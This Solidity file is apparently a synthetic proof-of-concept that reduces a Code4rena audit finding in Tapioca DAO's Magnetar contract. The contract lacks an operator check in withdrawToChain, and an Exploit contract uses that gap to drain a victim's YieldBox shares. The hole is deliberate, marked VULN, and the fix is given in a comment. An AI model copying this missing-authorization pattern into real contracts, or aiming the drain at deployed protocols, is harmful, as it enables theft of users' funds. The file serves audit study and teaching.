// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Tapioca DAO — [H-38] Magnetar contract has no approval checking
    (Code4rena 2023-07-tapioca, reporter carrotsmuggler, finding #27528).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: Magnetar helper functions (e.g. withdrawToChain) operate on a
    caller-supplied `from` address without checking that msg.sender is an
    approved operator of `from`. Users who approved Magnetar (via YieldBox
    setApprovalForAll / market updateOperator) so they can use the helpers
    expose their entire position: any third party can call withdrawToChain
    with from=victim and drain YieldBox shares to an attacker-chosen receiver.

    Blamed withdraw path preserved with @> VULN.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name = "USDO";
    string public symbol = "USDO";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Minimal YieldBox: deposits hold ERC20, balance tracked as shares 1:1.
contract MockYieldBox {
    MockERC20 public immutable token;
    mapping(address => uint256) public balanceOf; // shares
    mapping(address => mapping(address => bool)) public isApprovedForAll;

    constructor(MockERC20 t) {
        token = t;
    }

    function setApprovalForAll(address operator, bool approved) external {
        isApprovedForAll[msg.sender][operator] = approved;
    }

    function deposit(address from, address to, uint256 amount) external {
        token.transferFrom(from, address(this), amount);
        balanceOf[to] += amount;
    }

    /// @dev Real YieldBox.withdraw checks approval of `from` for msg.sender.
    function withdraw(uint256 /*assetId*/, address from, address to, uint256 amount, uint256 /*share*/) external {
        require(from == msg.sender || isApprovedForAll[from][msg.sender], "yb: not approved");
        balanceOf[from] -= amount;
        token.transfer(to, amount);
    }
}

/// @notice Reduced Magnetar periphery. withdrawToChain does NOT verify that
///         msg.sender may act for `from` — it only relies on YieldBox approval
///         that users grant to Magnetar itself.
contract Magnetar {
    MockYieldBox public immutable yieldBox;

    constructor(MockYieldBox yb) {
        yieldBox = yb;
    }

    /// @dev Verbatim reduction of the blamed path: no msg.sender / operator check.
    function withdrawToChain(
        uint256 assetId,
        address from,
        address receiver,
        uint256 amount,
        uint256 share
    ) external {
        // @> VULN: no check that msg.sender is approved operator of `from`.
        // Any caller can drain `from`'s YieldBox shares because YieldBox only
        // sees Magnetar (this contract) as the approved operator.
        // FIX: require(operators[from][msg.sender] || msg.sender == from);
        yieldBox.withdraw(assetId, from, receiver, amount, share);
    }
}

contract Victim {
    function approveMagnetar(MockYieldBox yb, Magnetar m) external {
        yb.setApprovalForAll(address(m), true);
    }
}

contract Exploit {
    MockERC20 public token;
    MockYieldBox public yieldBox;
    Magnetar public magnetar;
    Victim public victim;

    uint256 public constant ASSET_ID = 1;
    uint256 public constant VICTIM_DEPOSIT = 1000 ether;
    uint256 public stolen;

    constructor() {
        token = new MockERC20();
        yieldBox = new MockYieldBox(token);
        magnetar = new Magnetar(yieldBox);
        victim = new Victim();

        // Victim deposits USDO into YieldBox and approves Magnetar (normal UX).
        token.mint(address(this), VICTIM_DEPOSIT);
        token.approve(address(yieldBox), VICTIM_DEPOSIT);
        yieldBox.deposit(address(this), address(victim), VICTIM_DEPOSIT);
        victim.approveMagnetar(yieldBox, magnetar);
    }

    function run() external {
        require(yieldBox.balanceOf(address(victim)) == VICTIM_DEPOSIT, "victim funded");
        require(token.balanceOf(address(this)) == 0, "attacker empty pre");

        // Attacker (this contract) calls Magnetar with from=victim — no operator check.
        magnetar.withdrawToChain(ASSET_ID, address(victim), address(this), VICTIM_DEPOSIT, 0);

        stolen = token.balanceOf(address(this));
        require(stolen == VICTIM_DEPOSIT, "harm: full drain");
        require(yieldBox.balanceOf(address(victim)) == 0, "harm: victim empty");
    }
}
